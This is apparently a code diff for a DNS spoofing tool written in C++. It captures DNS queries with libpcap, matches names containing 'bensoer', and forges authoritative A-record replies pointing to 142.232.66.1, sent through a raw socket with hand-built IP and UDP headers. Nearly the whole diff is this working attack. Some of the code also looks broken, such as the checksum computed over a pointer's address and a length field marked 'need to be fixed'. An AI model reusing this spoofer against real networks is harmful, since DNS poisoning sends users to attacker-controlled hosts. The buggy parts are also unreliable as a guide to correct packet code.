@@ -14,7 +14,8 @@
 #include <netinet/ip.h>
 #include <netinet/ether.h>
 #include <arpa/inet.h>
-
+#include <string>
+#include <stdlib.h>
 
 /**
  * instance is the instance stored in the network monitor of the netowrk monirot. This is used to enforce a singleton
@@ -23,6 +24,24 @@
 NetworkMonitor * NetworkMonitor::instance = nullptr;
 
 NetworkMonitor::NetworkMonitor() {
+
+
+    //constructor
+    this->rawSocket = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
+
+    // Set SO_REUSEADDR so that the port can be resused for further invocations of the application
+    int arg = 1;
+    if (setsockopt (this->rawSocket, SOL_SOCKET, SO_REUSEADDR, &arg, sizeof(arg)) == -1){
+        perror("setsockopt");
+    }
+
+    //IP_HDRINCL to stop the kernel from building the packet headers
+    {
+        int one = 1;
+        const int *val = &one;
+        if (setsockopt(this->rawSocket, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
+            perror("setsockopt");
+    }
 
 }
 
@@ -55,8 +74,11 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
 
     Logger::debug("Packet Found. Now Parsing");
 
+
+
     //struct sniff_ethernet * ethernet = (struct sniff_ethernet*)(packet);
     struct iphdr * ip = (struct iphdr*)(packet + SIZE_ETHERNET);
+    printf("Total Length At Recv: %d\n", ntohs(ip->tot_len));
 
     //switch the ip now to save us work later
 
@@ -68,9 +90,16 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     char oldIPDestination[INET_ADDRSTRLEN];
     inet_ntop(AF_INET, &da, oldIPDestination, INET_ADDRSTRLEN);
 
-    in_addr_t tmp = ip->saddr;
+    printf("Source: %s\n", oldIPSource);
+    printf("Destination: %s\n", oldIPDestination);
+
+
+    u_int32_t tmp = ip->saddr;
     ip->saddr = ip->daddr;
+    //ip->saddr = inet_addr("192.168.10.10");
     ip->daddr = tmp;
+    ip->ttl = 255;
+    ip->id = htonl((rand() % 11000) + 29000);
 
     //u_int size_ip = IP_HL(ip) * 4;
     //u_int size_ip = sizeof(*ip) + 2;
@@ -80,6 +109,8 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     printf("size_ip2: %d\n", size_ip2);
     printf("size_ip: %d\n", size_ip);
 
+
+
     struct udphdr * udp = (struct udphdr *)(packet + SIZE_ETHERNET + size_ip);
 
 
@@ -87,19 +118,37 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     int oldDest = ntohs(udp->uh_dport);
     int oldSource = ntohs(udp->uh_sport);
     u_int16_t dest = udp->dest;
-    udp->dest = htons(oldSource);
-    udp->uh_dport = htons(oldSource);
 
+    //udp->dest = htons(oldSource);
+    udp->dest = htons(oldSource);
     udp->source = htons(oldDest);
-    udp->uh_sport = htons(oldDest);
+
+
 
     // ^ COULD BE BUGS IN HERE ?
+
+    //create dest address struct for sendto
+    struct sockaddr_in sin;
+    pseudo_header psh;
+
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(oldSource);
+    sin.sin_addr.s_addr = inet_addr(oldIPSource);
+
+
 
 
     //u_char * payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + 8);
     //grab the DNS payload out
     struct DNS_HEADER *dns = (struct DNS_HEADER *) (packet + SIZE_ETHERNET + size_ip + sizeof(*udp));
     char *query = (char *)(packet + SIZE_ETHERNET + size_ip + sizeof(*udp) + sizeof(struct DNS_HEADER));
+
+    //change dns question to response
+    dns->qr = 1;
+    dns->aa = 1;
+    dns->tc = 0;
+    dns->ans_count = dns->q_count; //were gonna answer as many questions as there are
+
 
     cout << "---------------------------------------------" << endl;
     cout << "Structures Found Over Packet" << endl;
@@ -122,15 +171,19 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
     int index = 0;
     QUERY * questionsList = new QUERY[ntohs(dns->q_count)];
 
+
+    bool foundURL = false; //sets to true when we have found in the question queries the domain we want to spoof
     char * ptr = query;
     //Now parse questions out
     for(int i = 0; i < ntohs(dns->q_count); ++i){
 
         bool keepProcessing = true;
         string queryName = "";
+        string rawName="";
         bool isFirst = true;
         while(keepProcessing){
 
+            rawName += (*ptr);
             int len = (int)(*ptr);
             //cout << "To Read In Segment. Length Is: >" << len << "< Bytes Long" << endl;
 
@@ -152,6 +205,7 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
                 string segment = "";
                 for(int i = 0; i < len; ++i){
                     char c = (*ptr);
+                    rawName += c;
                     //cout << "Character Is: >" << c << "<" << endl;
                     segment += c;
                     ptr++;
@@ -167,6 +221,7 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
         ++ptr; // pointer is now looking at header information for question
         struct QUESTION * question = (struct QUESTION *)ptr;
         QUERY * questionQuery = new QUERY;
+        questionQuery->rawName = rawName;
         questionQuery->name = queryName;
         questionQuery->ques = question;
         questionsList[index++] = (*questionQuery);
@@ -175,31 +230,87 @@ void NetworkMonitor::packetCallback(u_char* ptrnull, const struct pcap_pkthdr *p
         cout << "Class " << ntohs(questionQuery->ques->qclass) << endl;
         cout << "Type " << ntohs(questionQuery->ques->qtype) << endl;
 
+        if(questionQuery->name.find("bensoer") != string::npos){
+            foundURL = true;
+        }
+
         ptr += sizeof(struct QUESTION); //move the pointer past this section
 
     }
 
-    //switch DNS flags now to save us work later
-
-    cout << "ALL DONE WITH THIS PACKET " << endl;
+    cout << "ALL DONE PARSING PACKET. NOW CHECKING IF SHOULD SPOOF" << endl;
+    if(foundURL){
+        cout << "REQUEST BELONGS TO DESIRED SPOOF. SENDING RESPONSE" << endl;
+    }else{
+        return;
+    }
 
     cout << "NOW TO SEND THE RESPONSE" << endl;
 
-    //make our repsonse packet. get it ready
-    char responsePacket[65536];
-    memset(responsePacket, 0, 65536);
+    //make our response packet. get it ready
+    char responsePacket[65535];
+    memset(responsePacket, 0, 65535);
     //copy everything we have anyway on the dealio
-    memcpy(responsePacket, packet, pkt_info->len);
+    memcpy(responsePacket, packet + SIZE_ETHERNET, pkt_info->len);
 
     //get pointer to the end
-    unsigned long addrDif = (const u_char *)ptr - packet;
+    unsigned long addrDif = (const u_char *)ptr - (packet + SIZE_ETHERNET);
     char * responsePtr = responsePacket;
     responsePtr += addrDif;
 
+    int questionListContentSize = 0;
+    for(int i = 0; i < ntohs(dns->q_count); ++i){
+
+        //copy in the query information
+        //memcpy(responsePtr, questionsList[i].rawName.c_str(), questionsList[i].rawName.size());
+        //responsePtr += questionsList[i].rawName.size();
+        //questionListContentSize += questionsList[i].rawName.size();
+
+        short hex = 0x0CC0;
+        memcpy(responsePtr, &hex, 2);
+        responsePtr += 2;
+        questionListContentSize += 2;
+
+        struct R_DATA * fakeResponse = (struct R_DATA *)responsePtr;
+        fakeResponse->type = htons(T_A);
+        fakeResponse->_class = htons(1);
+        fakeResponse->ttl = htonl(300);
+        fakeResponse->data_len = htons(4); //need to be fixed;
+        fakeResponse->address = inet_addr("142.232.66.1");
+        //YAHOO: 206.190.36.45
+
+        //copy in the fake response ?
+        memcpy(responsePtr, fakeResponse, sizeof(struct R_DATA));
+
+        responsePtr += sizeof(struct R_DATA);
+    }
+
+    //recalc ip length
+    struct iphdr * rip = (struct iphdr*)(responsePacket);
+    rip->tot_len = htons( ntohs(ip->tot_len) + (( ntohs(dns->q_count) * sizeof(struct R_DATA)) + questionListContentSize));
+    cout << "Original IP Length: " << ntohs(ip->tot_len) << endl;
+    cout << "Response IP Length: " << ntohs(rip->tot_len) << endl;
+
+    //recalc udp length
+    struct udphdr * rudp = (struct udphdr *)(responsePacket + size_ip);
+    rudp->len = htons( ntohs(udp->len) + (( ntohs(dns->q_count) * sizeof(struct R_DATA)) + questionListContentSize));
+    cout << "Original UDP Length: " << ntohs(udp->len) << endl;
+    cout << "Response UDP Length: " << ntohs(rudp->len) << endl;
 
 
+    //calculate new checksum for pseudoheader
+    psh.dest_address = sin.sin_addr.s_addr;
+    psh.source_address = inet_addr(oldIPDestination);
+    psh.placeholder = 0;
+    psh.protocol = IPPROTO_UDP;
 
+    memcpy(&psh.udp, rudp, sizeof(struct udphdr));
+    rudp->check = NetworkMonitor::instance->csum((unsigned short *) & rudp, sizeof(pseudo_header));
 
+    //time to send this garbage
+    if(sendto(NetworkMonitor::instance->rawSocket, responsePacket, ntohs(rip->tot_len), 0, (struct sockaddr *) &sin, sizeof(sin)) < 0){
+        perror("sendto");
+    }
 
 
     //NetworkMonitor::instance->killListening();
@@ -263,4 +374,35 @@ string NetworkMonitor::listenForTraffic(pcap_if_t * listeningInterface) {
         return (*this->data);
     }
 
+}
+
+/**
+ * csum is a helper method that generates the checksum needed for the response packet to be validated and sent
+ * by the network stack
+ * @param ptr
+ * @param nbytes
+ * @return
+ */
+unsigned short NetworkMonitor::csum (unsigned short *ptr,int nbytes)
+{
+    register long sum;
+    unsigned short oddbyte;
+    register short answer;
+
+    sum=0;
+    while(nbytes>1) {
+        sum+=*ptr++;
+        nbytes-=2;
+    }
+    if(nbytes==1) {
+        oddbyte=0;
+        *((u_char*)&oddbyte)=*(u_char*)ptr;
+        sum+=oddbyte;
+    }
+
+    sum = (sum>>16)+(sum & 0xffff);
+    sum = sum + (sum>>16);
+    answer=(short)~sum;
+
+    return(answer);
 }
